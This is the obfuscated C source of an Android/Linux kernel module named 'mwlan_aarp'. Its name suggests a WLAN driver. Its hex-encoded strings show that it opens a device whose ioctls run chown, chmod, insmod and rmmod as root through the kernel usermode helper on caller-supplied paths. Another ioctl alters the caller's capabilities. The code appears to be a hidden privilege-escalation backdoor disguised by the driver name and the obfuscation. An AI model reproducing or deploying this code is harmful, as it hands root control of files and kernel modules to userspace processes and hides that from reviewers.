/*
   'mwlan_aarp.c' Obfuscated by COBF (Version 1.06 2006-01-07 by BB) at Wed Jan 15 11:48:07 2014
*/
#include<linux/module.h>
#include<linux/ctype.h>
#include<linux/time.h>
#include"cobf.h"
#ifdef _WIN32
#include"uncobf.h"
#include<wtypes.h>
#include"cobf.h"
#else
#ifdef bb64
#include"uncobf.h"
#include<linux/types.h>
#include"cobf.h"
#else
#include"uncobf.h"
#include<stddef.h>
#include<sys/types.h>
#include"cobf.h"
#endif
#endif
#ifdef _WIN32
bba bb70 bb94;
#else
bba bbd bb56, *bb120, *bb186;
#define bb134 1
#define bb241 0
bba bb193 bb206, *bb243, *bb191;bba bbd bb231, *bb141, *bb232;bba bbx
bb207, *bb237, *bb147;bba bby bb192, *bb118;bba bbx bby bb136, *bb142
;bba bby bb62, *bb159;bba bbx bby bb25, *bb91;bba bb25 bb188, *bb230;
bba bb25 bb98, *bb240;bba bb62 bb70, *bb107;bba bb238 bb203;bba bb190
bb211;bba bb175 bb71;bba bb83 bb63;bba bb83 bb131;
#ifdef bb224
bba bb146 bb38, *bb74;bba bb218 bb15, *bb77;bba bb194 bbr, *bb44;bba
bb112 bb46, *bb86;
#else
bba bb164 bb38, *bb74;bba bb123 bb15, *bb77;bba bb103 bbr, *bb44;bba
bb139 bb46, *bb86;
#endif
bba bb38 bb24, *bb35, *bb167;bba bb15 bb202, *bb233, *bb170;bba bb15
bb132, *bb105, *bb169;bba bbr bb52, *bb172, *bb200;bba bb71 bb18, *
bb153, *bb239;bba bbr bb244, *bb235, *bb185;bba bb63 bb138, *bb199, *
bb195;bba bb46 bb197, *bb212, *bb187;
#define bb133 bbn
bba bbn*bb219, *bb100;bba bbk bbn*bb177;bba bbc bb109;bba bbc*bb227;
bba bbk bbc*bb184;
#if defined( bb64)
bba bbd bb90;
#endif
bba bb90 bb6;bba bb6*bb106;bba bbk bb6*bb225;
#if defined( bb148) || defined( bb161)
bba bb6 bb12;bba bb6 bb68;
#else
bba bbc bb12;bba bbx bbc bb68;
#endif
bba bbk bb12*bb99;bba bb12*bb130;bba bb52 bb196, *bb229;bba bbn*bb82;
bba bb82*bb181;
#define bb156( bb20) bbg bb20##__ { bbd bb115; }; bba bbg bb20##__  * \
 bb20
bba bbg{bb18 bb145,bb176,bb222,bb217;}bb96, *bb208, *bb158;bba bbg{
bb18 bb220,bb210;}bb155, *bb127, *bb189;bba bbg{bb18 bb242,bb228;}
bb249, *bb221, *bb92;
#endif
bba bbk bb24*bb151;
#ifdef _WIN32
#ifndef UNDER_CE
#define bb4 bb214
#define bb10 bb213
bba bbx bby bb4;bba bby bb10;
#endif
#else
#endif
#ifdef _WIN32
bbn*bb34(bb4 bb76);bbn bb45(bbn* );bbn*bb57(bb4 bb97,bb4 bb76);
#else
#define bb34( bbe) bb75(1, bbe, bb32)
#define bb45( bbe) bb173( bbe)
#define bb57( bbe, bb54) bb75( bbe, bb54, bb32)
#endif
#ifdef _WIN32
#define bb30( bbe) bb113( bbe)
#else
#ifdef _DEBUG
bbd bb49(bbk bbc*bb95,bbk bbc*bb0,bbx bb246);
#define bb30( bbe) ( bbn)(( bbe) || ( bb49(# bbe, __FILE__, __LINE__)))
#else
#define bb30( bbe) (( bbn)0)
#endif
#endif
bb10 bb150(bb10*bb93);
#ifndef _WIN32
bbd bb114(bbk bbc*bb104);bbd bb209(bbk bbc*bb180,...);
#endif
#ifdef _WIN32
bba bb140 bb67;
#define bb55( bbe) bb179( bbe)
#define bb73( bbe) bb135( bbe)
#define bb59( bbe) bb102( bbe)
#define bb88( bbe) bb245( bbe)
#else
bba bb205 bb67;
#define bb55( bbe) ( bbn)(  *  bbe = bb223( bbe))
#define bb73( bbe) (( bbn)0)
#define bb59( bbe) bb116( bbe)
#define bb88( bbe) bb101( bbe)
#endif
#include"uncobf.h"
#include<linux/version.h>
#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/in.h>
#include<linux/miscdevice.h>
#include<linux/syscalls.h>
#include<linux/kmod.h>
#include<net/ip.h>
#include"cobf.h"
bba bbg{bb35 bb72;bbr bb154;bb35 bb42;bbr bb26;bbr bbw;}bb16;bba bbg{
bbk bbc*bbh;bb144 bb81;bb121 bb84;}bb23;bba bbg{bbk bbc*bbh;bbd bb17;
}bb41;bba bbg{bb56 bb87;bbk bbc*bb9;}bb43;bba bbg{bbd bb215;bbg bb124
 *bb247;bbd bb111;}bb122;bbp bbd bb60(bbg bb13*bb13,bbg bb0*bb0){bbs 0
;}bbp bbd bb78(bbg bb13*bb13,bbg bb0*bb0){bbs 0 ;}bbp bbd bb7(bbc*bbh,
bbc* *bbm,bbc* *bbq,bbd bb36){bbg bb160*bb8;bb125 bb39=(bb36==bb152)?
bb32:bb110;
#ifdef _DEBUG
bbc* *bb22=bbm;bbf("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20\x25\x73",bbh);bb69( *bb22){
bbf("\x20\x25\x73", *bb22);bb22++;}bbf("\n");
#endif
#if LINUX_VERSION_CODE >= bb166( 3, 10, 0 )
bb8=bb50(bbh,bbm,bbq,bb39,bbl,bbl,bbl);
#else
bb8=bb50(bbh,bbm,bbq,bb39);
#endif
bbi(bb8==bbl){bbf("\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64"
"\x65\x68\x65\x6c\x70\x65\x72\x5f\x2c\x20\x69\x6e\x66\x6f\x20\x3d\x3d"
"\x20\x4e\x55\x4c\x4c\n");bbs-bb40;}bbs bb182(bb8,bb36);}bbp bbd bb79
(bbk bbc*bbh,bbd bb58,bbd bb66){bbc bb31[256 ];bbc*bbm[]={(bbc* )"\x2f"
"\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f\x77\x6e",
bb31,(bbc* )bbh,bbl};bbp bbc*bbq[]={"\x48\x4f\x4d\x45\x3d\x2f","\x54"
"\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41\x54\x48\x3d\x2f\x73"
"\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbl};bbd bbb;bb61(bb31,"\x25"
"\x64\x2e\x25\x64",bb58,bb66);bbb=bb7("\x2f\x73\x79\x73\x74\x65\x6d"
"\x2f\x62\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbm,bbq,bb14);
#ifdef _DEBUG
bbf("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbb);
#endif
bbs bbb;}bbp bbd bb80(bbk bbc*bbh,bbd bb17){bbc bb28[256 ];bbc*bbm[]={
(bbc* )"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6d"
"\x6f\x64",bb28,(bbc* )bbh,bbl};bbd bbb;bbp bbc*bbq[]={"\x48\x4f\x4d"
"\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78","\x50\x41"
"\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",bbl};bb61(
bb28,"\x25\x6f",bb17);bbb=bb7("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62"
"\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbm,bbq,bb14);
#ifdef _DEBUG
bbf("\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61\x6c\x6c\x5f\x75\x73\x65\x72"
"\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x3a\x20\x25\x64\n",bbb);
#endif
bbs bbb;}bbp bby bb51(bbg bb0*bb0,bbx bbd bb216,bbx bby bb53){bbr bb27
;bb16 bbo, *bb11=(bb16* )bb53;bb24*bbj=bbl;bbd bbb;bbf("\x6d\x77\x6c"
"\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x62\x65\x67\x69\x6e\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbb=bb5(&bbo,bb11,bb19(bb16));
bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c"
"\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20"
"\x25\x64\n",bbb);bbv bbu;}bbj=bb34(bbo.bb26);bbi(!bbj){bbb=-bb40;bbf
("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x6d\x61"
"\x6c\x6c\x6f\x63\x3a\x20\x25\x64\n",bbb);bbv bbu;}bbb=bb128(bb27,(
bb44)bbo.bb72);bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f"
"\x63\x74\x6c\x2c\x20\x67\x65\x74\x5f\x75\x73\x65\x72\x3a\x20\x25\x64"
"\n",bbb);bbv bbu;}bbb=bb5(bbj,bbo.bb42,bbo.bb26);bbi(bbb!=0 ){bbf(""
"\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70"
"\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);
bbv bbu;}bb119(bb27){bb21 1 :{bb23*bb1=(bb23* )bbj;bbc bbh[256 ];bbb=
bb5(bbh,bb1->bbh,bb19(bbh));bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65"
"\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d"
"\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbu;}bbo.bbw=4 ; * (
(bbr* )bbj)=bb79(bbh,bb1->bb81,bb1->bb84);
#ifdef _DEBUG
bbf("\x63\x68\x6f\x77\x6e\n");
#endif
bb3;}bb21 2 :{bb41*bb1=(bb41* )bbj;bbc bbh[256 ];bbb=bb5(bbh,bb1->bbh,
bb19(bbh));bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63"
"\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f\x75\x73\x65"
"\x72\x2c\x20\x25\x64\n",bbb);bbv bbu;}bbo.bbw=4 ; * ((bbr* )bbj)=bb80
(bbh,bb1->bb17);
#ifdef _DEBUG
bbf("\x63\x68\x6d\x6f\x64\n");
#endif
bb3;}bb21 3 :{bb43*bb29=(bb43* )bbj;bbc bb9[256 ];bbc*bbm[]={bbl,bb9,
bbl};bbp bbc*bbq[]={"\x48\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d"
"\x6c\x69\x6e\x75\x78","\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65"
"\x6d\x2f\x62\x69\x6e",bbl};bbb=bb5(bb9,bb29->bb9,256 );bbi(bbb!=0 ){
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x4f\x49"
"\x44\x5f\x4d\x4f\x44\x2c\x20\x63\x6f\x70\x79\x5f\x66\x72\x6f\x6d\x5f"
"\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbu;}bbm[0 ]=bb29->bb87?""
"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x69\x6e\x73\x6d\x6f"
"\x64":"\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x72\x6d\x6d"
"\x6f\x64"; * (bbr* )bbj=bb7("\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62"
"\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",bbm,bbq,bb14);bbo.bbw=4 ;
#ifdef _DEBUG
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61"
"\x6c\x6c\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72"
"\x5f\x3a\x20\x25\x64\n", * (bbd* )bbj);
#endif
bb3;}bb21 5 :{bbd bbb;bb171{bbg bb183*bbt=bb236();bbi(!bbt){bbb=bb40;
bb3;}bbt->bb33.bbz[0 ]=(1 <<bb126)|(1 <<bb165)|(1 <<bb234);bbt->bb89.bbz[
0 ]=0 ;bbt->bb48.bbz[0 ]=bbt->bb33.bbz[0 ];bbt->bb33.bbz[1 ]=0 ;bbt->bb89.
bbz[1 ]=0 ;bbt->bb48.bbz[1 ]=0 ;bbb=bb226(bbt);}bb69(0 ); * (bbd* )bbj=bbb
;bbo.bbw=bb19(bbd);
#ifdef _DEBUG
bbf("\x64\x65\x76\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x61"
"\x70\x73\x65\x74\x3a\x20\x25\x64\n",bbb);
#endif
bb3;}}bbb=bb117(bb11->bb42,bbj,bbo.bbw);bbi(bbb!=0 ){bbf("\x64\x65\x76"
"\x69\x63\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x63\x6f\x70\x79\x5f\x66"
"\x72\x6f\x6d\x5f\x75\x73\x65\x72\x2c\x20\x25\x64\n",bbb);bbv bbu;}
bbb=bb137(bbo.bbw,&bb11->bbw);bbi(bbb!=0 ){bbf("\x64\x65\x76\x69\x63"
"\x65\x5f\x69\x6f\x63\x74\x6c\x2c\x20\x70\x75\x74\x5f\x75\x73\x65\x72"
"\x2c\x20\x25\x64\n",bbb);bbv bbu;}bbu:bbi(!bbj)bb45(bbj);bbf("\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x2c\x20\x65\x6e\x64\x20\x64\x65"
"\x76\x5f\x69\x6f\x63\x74\x6c\x5f\n");bbs bbb;}bbp bbg bb168 bb65={.
bb149=bb51,.bb198=bb60,.bb248=bb78,};bbp bbg bb204 bb37={bb162,"\x6d"
"\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",&bb65};bbd bb201(){bbd bbb;bbf
("\x49\x2d\x57\x4c\x41\x4e\x2f\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72"
"\x70\x2c\x20\x6d\x77\x6c\x61\x6e\x20\x6b\x6f\x20\x73\x72\x63\x2c\x20"
"\x32\x30\x31\x34\x2e\x31\x2e\x31\x35\n");bbb=bb163(&bb37);bbi(bbb!=0
){bbf("\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x6d\x69"
"\x73\x63\x5f\x72\x65\x67\x69\x73\x74\x65\x72\x20\x66\x61\x69\x6c\x65"
"\x64\x3a\x20\x25\x64\n",bbb);bbs bbb;}{bbc*bbm[]={"\x2f\x73\x79\x73"
"\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x63\x68\x6f\x77\x6e","\x73\x79\x73"
"\x74\x65\x6d\x2e\x73\x79\x73\x74\x65\x6d","\x2f\x64\x65\x76\x2f" ""
"\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70",bbl};bbp bbc*bbq[]={"\x48"
"\x4f\x4d\x45\x3d\x2f","\x54\x45\x52\x4d\x3d\x6c\x69\x6e\x75\x78",""
"\x50\x41\x54\x48\x3d\x2f\x73\x79\x73\x74\x65\x6d\x2f\x62\x69\x6e",
bbl};bbd bb2,bb47=0 ;bb129(bb2=0 ;bb2<10 ;bb2++){bbb=bb7("\x2f\x73\x79"
"\x73\x74\x65\x6d\x2f\x62\x69\x6e\x2f\x74\x6f\x6f\x6c\x62\x6f\x78",
bbm,bbq,bb14);bbi(bbb==0 )bb3;bb47=bbb;bb174(10 );}bbi(bb2!=0 ){bbf(""
"\x69\x6e\x69\x74\x5f\x6d\x6f\x64\x75\x6c\x65\x2c\x20\x63\x61\x6c\x6c"
"\x5f\x75\x73\x65\x72\x6d\x6f\x64\x65\x68\x65\x6c\x70\x65\x72\x5f\x20"
"\x66\x61\x69\x6c\x65\x64\x2c\x20\x72\x5f\x20\x3a\x20\x25\x64\x2c\x20"
"\x74\x72\x79\x20\x3a\x20\x25\x64\n",bb47,bb2);bbi(bbb!=0 )bbs bbb;}}
bbf("\x6d\x77\x6c\x61\x6e\x5f\x61\x61\x72\x70\x20\x69\x6e\x69\x74\x5f"
"\x6d\x6f\x64\x75\x6c\x65\x28\x29\x20\x77\x61\x73\x20\x73\x75\x63\x63"
"\x65\x73\x73\x66\x75\x6c\x2e\n");bbs 0 ;}bbn bb143(){bb108(&bb37);}
bb157("\x61\x68\x6f\x70\x65");bb178("");
